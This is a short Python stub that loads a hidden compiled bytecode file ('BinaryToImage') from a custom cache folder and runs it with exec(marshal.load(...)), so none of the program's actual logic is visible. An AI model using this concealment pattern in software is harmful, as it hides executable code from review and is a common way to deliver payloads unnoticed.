
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'BinaryToImage_79755e45f0444772bd5453fc2c789853.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
